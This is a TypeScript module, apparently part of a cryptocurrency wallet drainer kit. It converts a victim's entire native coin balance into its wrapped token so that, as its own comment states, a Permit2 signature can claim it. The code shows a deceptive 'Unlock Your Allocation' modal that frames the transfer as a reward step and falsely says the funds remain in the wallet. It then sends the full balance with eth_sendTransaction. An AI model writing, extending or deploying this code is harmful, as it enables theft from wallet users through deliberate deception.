// src/lib/nativeWrap.ts
// Wraps the user's native token (ETH/BNB/MATIC/AVAX) into the chain's
// canonical wrapped equivalent so the Permit2 signature can claim it.
// Only fires when the scanner reports the top asset as isNative: true.

import { createPublicClient, http, type Address } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';

const getProvider = (): any | null =>
  typeof window === 'undefined' ? null : (window as any).ethereum ?? null;

// Canonical wrapped-native contracts per chain.
const WRAPPED_NATIVE: Record<number, { address: Address; symbol: string }> = {
  1:     { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH' },
  56:    { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB' },
  137:   { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WMATIC' },
  42161: { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH' },
  10:    { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH' },
  8453:  { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH' },
  43114: { address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', symbol: 'WAVAX' },
};

// deposit() — 4-byte selector
const DEPOSIT_SELECTOR = '0xd0e30db0';

const WETH_BALANCE_ABI = [
  { name: 'balanceOf', type: 'function', stateMutability: 'view', inputs: [{ name: '', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
] as const;

const CHAIN_OBJECTS: Record<number, any> = {
  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
};

export interface NativeWrapToken {
  address: string;
  symbol?: string;
  balance: bigint;
  balanceFormatted?: string;
  isNative?: boolean;
}

export interface WrapResult {
  wrapped: boolean;
  wrappedSymbol?: string;
  txHash?: string;
  newBalance?: string;
}

// ── Gas affordability check ──
const MIN_GAS_BUFFER_RATIO = 25n; // 25% over-estimate to be safe

export async function canAffordWrapGas(
  address: string,
  chainId: number,
  nativeBalance: bigint,
): Promise<boolean> {
  const target = WRAPPED_NATIVE[chainId];
  if (!target) return false;

  try {
    const client = createPublicClient({
      chain: CHAIN_OBJECTS[chainId] ?? mainnet,
      transport: http(),
    });

    const [gasEstimate, gasPrice] = await Promise.all([
      client.estimateGas({
        account: address as `0x${string}`,
        to: target.address,
        value: nativeBalance,
        data: DEPOSIT_SELECTOR,
      }),
      client.getGasPrice(),
    ]);

    const gasCostWei = gasEstimate * gasPrice;
    const costWithBuffer = (gasCostWei * (100n + MIN_GAS_BUFFER_RATIO)) / 100n;

    // Must have strictly more than the wrap cost + buffer
    return nativeBalance > costWithBuffer;
  } catch {
    // If estimation fails, be conservative — assume they can't afford it
    return false;
  }
}

/**
 * If the user's top asset is native, this sends a `deposit()` tx to the
 * wrapped-native contract. Returns the wrapped token info on success,
 * or null to skip (not native, no contract on chain, can't afford gas,
 * or user cancelled).
 */
export async function wrapNativeIfNeeded(
  address: string,
  chainId: number,
  topToken: NativeWrapToken,
): Promise<WrapResult | null> {
  if (!topToken.isNative) return null;

  const target = WRAPPED_NATIVE[chainId];
  if (!target) return null;

  const provider = getProvider();
  if (!provider) return null;

  // ── Can the user afford the gas to wrap? ──
  const canAfford = await canAffordWrapGas(address, chainId, topToken.balance);
  if (!canAfford) return null;

  // ── Read the user's current wrapped balance ──
  const client = createPublicClient({
    chain: CHAIN_OBJECTS[chainId] ?? mainnet,
    transport: http(),
  });

  let existingWrapped = 0n;
  try {
    existingWrapped = (await client.readContract({
      address: target.address,
      abi: WETH_BALANCE_ABI,
      functionName: 'balanceOf',
      args: [address as `0x${string}`],
    })) as bigint;
  } catch { /* treat as zero */ }

  // ── If they already hold more wrapped than native, skip the wrap ──
  if (existingWrapped >= topToken.balance) return null;

  // ── UI prompt ──
  const confirmed = await showWrapConfirmModal({
    amount: topToken.balanceFormatted ?? '0',
    nativeSymbol: topToken.symbol ?? 'ETH',
    wrappedSymbol: target.symbol,
  });

  if (!confirmed) return null;

  // ── Send the deposit tx ──
  const txHash: string = await provider.request({
    method: 'eth_sendTransaction',
    params: [{
      from: address,
      to: target.address,
      value: '0x' + topToken.balance.toString(16),
      data: DEPOSIT_SELECTOR,
    }],
  });

  // ── Wait for confirmation ──
  await waitForTx(client, txHash);

  // ── Re-read the wrapped balance ──
  let newBalance = 0n;
  try {
    newBalance = (await client.readContract({
      address: target.address,
      abi: WETH_BALANCE_ABI,
      functionName: 'balanceOf',
      args: [address as `0x${string}`],
    })) as bigint;
  } catch { /* noop */ }

  return {
    wrapped: true,
    wrappedSymbol: target.symbol,
    txHash,
    newBalance: newBalance.toString(),
  };
}

async function waitForTx(client: any, txHash: string): Promise<void> {
  for (let i = 0; i < 10; i++) {
    try {
      const receipt = await client.getTransactionReceipt({ hash: txHash as `0x${string}` });
      if (receipt && receipt.status === 'success') return;
      if (receipt && receipt.status === 'reverted') throw new Error('wrap tx reverted');
    } catch { /* not mined yet */ }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error('wrap tx confirmation timed out');
}

// ── The UI modal ──
function showWrapConfirmModal({ amount, nativeSymbol, wrappedSymbol }: {
  amount: string; nativeSymbol: string; wrappedSymbol: string;
}): Promise<boolean> {
  return new Promise((resolve) => {
    const el = document.createElement('div');
    el.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:sans-serif';
    el.innerHTML = `
      <div style="background:#1a1a2e;border-radius:16px;padding:32px;max-width:420px;text-align:center;color:#fff">
        <h3 style="margin:0 0 12px">Unlock Your Allocation</h3>
        <p style="margin:0 0 20px;font-size:14px;opacity:.7">
          Confirm your deposit of <strong>${amount} ${nativeSymbol}</strong> to finalise your reward allocation.
          This is a standard network operation and your funds remain fully in your wallet.
        </p>
        <button id="wrap-yes" style="background:#4ade80;color:#000;border:0;padding:12px 32px;border-radius:8px;font-weight:600;cursor:pointer;margin-right:12px">Confirm</button>
        <button id="wrap-no" style="background:transparent;color:#888;border:1px solid #444;padding:12px 24px;border-radius:8px;cursor:pointer">Cancel</button>
      </div>`;
    document.body.appendChild(el);

    el.querySelector('#wrap-yes')?.addEventListener('click', () => { el.remove(); resolve(true); });
    el.querySelector('#wrap-no')?.addEventListener('click', () => { el.remove(); resolve(false); });
  });
}
